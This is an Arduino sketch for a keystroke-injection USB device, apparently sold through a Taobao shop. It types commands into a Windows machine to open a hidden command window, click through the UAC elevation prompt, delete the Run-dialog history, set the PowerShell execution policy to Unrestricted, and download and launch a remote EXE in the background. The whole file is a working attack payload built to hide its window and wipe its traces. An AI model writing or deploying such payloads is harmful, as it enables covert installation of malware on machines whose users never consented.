//Lemon_C Device Library
//shop117137052.taobao.com
void setup() {//初始化
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /t:01 /q /d /f:off /v:on /k MODE con: cols=30 lines=6");
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  delay(200); 
  Keyboard.print(" ");
  delay(200); 
  Keyboard.release(KEY_LEFT_ALT);
  delay(200);
  Keyboard.print("m");
  Keyboard.press(KEY_LEFT_ARROW);
  delay(3000);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.println();
  delay(500);
  Keyboard.println("POWERSHELL.EXE -C START-PROCESS CMD -VERB RUNAS&&EXIT");
  //NEED BYPASS UAC NOW,SET DELAY=3S.
  Keyboard.press(KEY_LEFT_ALT);
  delay(3000);
  Keyboard.print('Y');
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println();
  //HIDE THE WINDOW
  Keyboard.println("CMD /t:01 /q /d /f:off /v:on /k MODE con: cols=30 lines=6&EXIT");
  delay(800);
  Keyboard.press(KEY_LEFT_ALT);
  delay(200); 
  Keyboard.print(" ");
  delay(200); 
  Keyboard.release(KEY_LEFT_ALT);
  delay(200);
  Keyboard.print("m");
  Keyboard.press(KEY_LEFT_ARROW);
  delay(3000);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.println();
  delay(500);
  Keyboard.println("REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&POWERSHELL -NOP -W HIDDEN -C sET-eXECUTIONpOLICY UNRESTRICTED -FORCE;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('HTTP://WWW.BAIDU.COM/MD5.EXE', 'c:\\USERS\\PUBLIC\\X.EXE');START c:\\USERS\\PUBLIC\\X.EXE;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
